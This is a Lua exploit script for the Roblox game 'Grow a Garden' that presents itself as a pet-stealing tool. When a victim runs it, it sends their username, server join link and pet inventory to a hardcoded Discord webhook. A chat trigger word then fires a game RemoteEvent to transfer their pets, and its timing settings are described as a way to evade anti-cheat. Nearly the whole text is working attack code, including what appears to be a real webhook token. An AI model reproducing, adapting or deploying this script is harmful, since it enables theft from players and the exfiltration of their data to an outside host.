-- Standalone Roblox script for stealing pets in Grow a Garden
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local VirtualInput = game:GetService("VirtualInputManager")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- Configuration (replace with your own webhook URL)
local WEBHOOK_URL ="https://discord.com/api/webhooks/1384924541343629493/O6b491x0IQE22fTOzTv4pfhLghrDWLJmBhyrt8nuPWTanXanNIEXyqUGPpja-MGUtc9P" -- Replace with your Discord webhook URL
local CHAT_TRIGGER ="stealnow" -- Chat trigger to activate pet theft
local E_HOLD_TIME = 0.05 -- Fast key hold for stealth
local E_DELAY = 0.1 -- Quick delay to avoid detection
local HOLD_TIMEOUT = 2 -- Short timeout to reduce anti-cheat flags

-- Send data to Discord webhook
local function sendToWebhook(data)
    local jsonData = HttpService:JSONEncode(data)
    local success = pcall(function()
        if syn and syn.request then
            syn.request({
                Url = WEBHOOK_URL,
                Method ="POST",
                Headers = {["Content-Type"] ="application/json"},
                Body = jsonData
            })
        elseif request then
            request({
                Url = WEBHOOK_URL,
                Method ="POST",
                Headers = {["Content-Type"] ="application/json"},
                Body = jsonData
            })
        else
            HttpService:PostAsync(WEBHOOK_URL, jsonData, Enum.HttpContentType.ApplicationJson)
        end
    end)
    if not success then
        warn("Failed to send webhook.")
    end
    return success
end

-- Get player’s pet inventory
local function getPetInventory()
    local inventory = {pets = {}}
    local bannedWords = {"Seed","Shovel","Tool","Egg","Sprinkler","Crate"}
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for_, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") and not table.find(bannedWords, item.Name) then
                table.insert(inventory.pets, item.Name)
            end
        end
    end
    return inventory
end

-- Notify Discord of victim
local function notifyVictim()
    local inventory = getPetInventory()
    local inventoryText = #inventory.pets > 0 and table.concat(inventory.pets,"\n") or"No pets"
    local messageData = {
        embeds = {{
            title ="New Target Found!",
            description ="Ready to steal pets in Grow a Garden!",
            color = 0xFF0000,
            fields = {
                {name ="Username", value = LocalPlayer.Name, inline = true},
                {name ="Join Link", value ="https://kebabman.vercel.app/start?placeId=126884695634066&gameInstanceId=" .. (game.JobId or"N/A"), inline = true},
                {name ="Pet Inventory", value ="```" .. inventoryText .. "```", inline = false},
                {name ="Steal Command", value ="Say in chat: `" .. CHAT_TRIGGER .. "`", inline = false}
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }
    sendToWebhook(messageData)
end

-- Find pet-related RemoteEvent
local function findPetRemote()
    for_, v in pairs(ReplicatedStorage:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Name:lower():find("pet") then
            return v
        end
    end
    return nil
end

-- Steal pets via RemoteEvent
local function stealPets(targetPlayer)
    local petRemote = findPetRemote()
    if not petRemote then
        warn("No pet remote found.")
        return false
    end
    local success = pcall(function()
        local petData = targetPlayer:FindFirstChild("PetInventory") or targetPlayer.Backpack
        if petData then
            for_, pet in pairs(petData:GetChildren()) do
                if pet:IsA("Tool") and not table.find({"Seed","Shovel","Tool","Egg"}, pet.Name) then
                    petRemote:FireServer("TransferPet", pet, LocalPlayer)
                    print("Stole pet:" .. pet.Name .. " from" .. targetPlayer.Name)
                    sendToWebhook({
                        embeds = {{
                            title ="Pet Stolen!",
                            description ="Grabbed a pet from" .. targetPlayer.Name,
                            color = 0x00FF00,
                            fields = {
                                {name ="Pet", value = pet.Name, inline = true},
                                {name ="Victim", value = targetPlayer.Name, inline = true}
                            },
                            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                        }}
                    })
                end
            end
        end
    end)
    return success
end

-- Simulate E key press for proximity prompts
local function holdE()
    VirtualInput:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    task.wait(E_HOLD_TIME)
    VirtualInput:SendKeyEvent(false, Enum.KeyCode.E, false, game)
end

-- Main stealing logic
local function executeSteal(speaker)
    local startTime = tick()
    while tick() - startTime < HOLD_TIMEOUT do
        holdE()
        task.wait(E_DELAY)
        if stealPets(speaker) then
            sendToWebhook({
                embeds = {{
                    title ="Steal Command Triggered!",
                    description ="Successfully executed steal from" .. speaker.Name,
                    color = 0x00FF00,
                    fields = {{name ="Command", value = CHAT_TRIGGER, inline = true}},
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
                }}
            })
            return true
        end
    end
    return false
end

-- Chat listener for trigger
local function setupChatListener()
    local TextChatService = game:GetService("TextChatService")
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        TextChatService.OnIncomingMessage = function(message)
            if message.Text:lower() == CHAT_TRIGGER:lower() then
                local speaker = message.TextSource and Players:GetPlayerByUserId(message.TextSource.UserId)
                if speaker then
                    executeSteal(speaker)
                end
            end
        end
    else
        Players.PlayerChatted:Connect(function(_, sender, message)
            if message:lower() == CHAT_TRIGGER:lower() then
                local speaker = Players:FindFirstChild(sender)
                if speaker then
                    executeSteal(speaker)
                end
            end
        end)
    end
end

-- Modify proximity prompts for faster interaction
local function modifyProximityPrompts()
    for_, object in pairs(game:GetDescendants()) do
        if object:IsA("ProximityPrompt") then
            object.HoldDuration = 0.01
        end
    end
    game.DescendantAdded:Connect(function(object)
        if object:IsA("ProximityPrompt") then
            object.HoldDuration = 0.01
        end
    end)
end

-- Initialize
notifyVictim()
setupChatListener()
modifyProximityPrompts()